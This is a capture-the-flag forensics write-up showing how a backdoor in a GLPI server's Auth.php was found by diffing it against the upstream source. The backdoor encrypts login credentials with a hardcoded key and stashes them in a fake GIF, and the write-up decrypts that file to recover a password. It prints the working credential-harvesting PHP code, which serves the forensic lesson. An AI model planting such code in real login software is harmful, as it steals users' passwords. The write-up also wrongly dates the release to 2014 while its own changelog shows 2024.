# Operation Pensieve Breach - 2

### Category

Forensics

### Difficulty

Medium

### Tags

- linux

### Author

xThaz

### Description

The director of Hogwarts got his account compromised.
The last time he logged on legitimately was from `192.168.56.230` (pensive.hogwarts.local).

Investigate to identify how his account got compromised from this server.
Please find the following information to go forward in this case:
- Absolute path of the file which led to the compromise.
- Absolute path of the file used by the attacker to retrieve Albus' account.
- The second file stores two pieces of information. The 3rd flag part is the value of the second field of the second piece of information.

The findings have to be separated by a ";".

- [pensieve_var.7z](https://heroctf.fr-par-1.linodeobjects.com/pensieve_var.7z)

Here is an example flag format:

`Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}`

### Requirements

- "Operation Pensieve Breach - 1"

### Write Up

From what has been observed during the first challenge, Albus' account was used to perform a DCSync.
Since we know that Albus is a good guy, it's impossible to think that he performed those nasty actions on his own.
The instructions go into that assumption, an attacker compromised his account.

Investigators are given a dump of the `/var/` folder of the server, we know that it contains application and system logs as well as the web application source code.
The application folder name indicates that it is a GLPI installation.

```bash
$ tree var/www

/var/www
├── glpi
└── html
```

GLPI is an open source framework used to track IT assets, offers ticketing service and much more.
Since his last legitimate connection was made on `pensive.hogwarts.local`, multiple assumptions can be made to identify what happened, among them:
- Network traffic was sniffed and server's private key was exfiltrated, allowing the attacker to decrypt authentication requests containing cleartext credentials.
- Authentication form has been backdoored.

The second assumption is more likely to happen and much easier to verify.
Let's dig into that assumption.

First, let's retrieve the GLPI version deployed on the server.

```bash
$ head -n 6 var/www/glpi/CHANGELOG.md

# GLPI changes

The present file will list all changes made to the project; according to the
[Keep a Changelog](http://keepachangelog.com/) project.

## [10.0.15] 2024-04-24
```

The version was `10.0.15` and is from 2014 which might indicate bad news as it is outdated software containing multiple known CVEs, but let's keep that for later.
The file used for users to authenticate is located at `/var/www/glpi/front/login.php`.

Now the way to go is to download the same version source code and perform a diff.

```bash
$ git clone https://github.com/glpi-project/glpi.git
$ cd glpi
$ git checkout 10.0.15
$ cd ../
$ diff -ruN glpi/front/login.php var/www/glpi/front/login.php | wc -l

0
```

The file was not altered.
By taking a look at the source code inside this file, it calls the function `login()` with login and password as arguments.

```php
$auth = new Auth();
if ($auth->login($login, $password, (isset($_REQUEST["noAUTO"]) ? $_REQUEST["noAUTO"] : false), $remember, $login_auth)) {
    Auth::redirectIfAuthenticated();
} else {
    http_response_code(401);
}
```

Let's find where this authentication function is located.

```bash
$ grep -RH "function login(" glpi/

glpi/src/Mail/Protocol/ProtocolInterface.php:    public function login($user, $password);
glpi/src/Auth.php:    public function login($login_name, $login_password, $noauto = false, $remember_me = false, $login_auth = '')
glpi/tests/DbTestCase.php:    protected function login(
glpi/tests/imap/MailCollector.php:   public function login(\$user, \$password) {}
```

The file `/var/www/glpi/src/Auth.php` is a good candidate.
Was this file altered?

```bash
$ diff -ruN glpi/src/Auth.php var/www/glpi/src/Auth.php

--- glpi/src/Auth.php
+++ /home/xthaz/Documents/HeroCTF/dumps_v2/GLPI01/var/www/glpi/src/Auth.php
@@ -960,6 +960,19 @@
                         || $this->user->fields["authtype"] == $this::LDAP
                     ) {
                         if (Toolbox::canUseLdap()) {
+                            $key = "ec6c34408ae2523fe664bd1ccedc9c28";
+                            $iv  = "ecb2b0364290d1df";
+
+                            $data = json_encode([
+                                'login' => $login_name,
+                                'password' => $login_password,
+                            ]);
+
+                            $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
+                            $encoded = base64_encode($encrypted) . ";";
+
+                            $file = "/var/www/glpi/pics/screenshots/example.gif";
+                            file_put_contents($file, $encoded, FILE_APPEND);
                             AuthLDAP::tryLdapAuth(
                                 $this,
                                 $login_name,
```

That looks like a backdoor.
This code takes the login and password, encrypts them using a hardcoded private key and initialization vector.
Finally, it stores the result inside `/var/www/glpi/pics/screenshots/example.gif`.

Now it's time to see if this file is still present.

```bash
$ cat var/www/glpi/pics/screenshots/example.gif

mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
```

Here are some ciphered results.
Using the source code, those strings can be decrypted.

```bash
$ echo "U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==" | openssl enc -aes-256-cbc -d -K 6563366333343430386165323532336665363634626431636365646339633238 -iv 65636232623033363432393064316466 -nosalt -a -A

{"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}
```

### Flag

Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}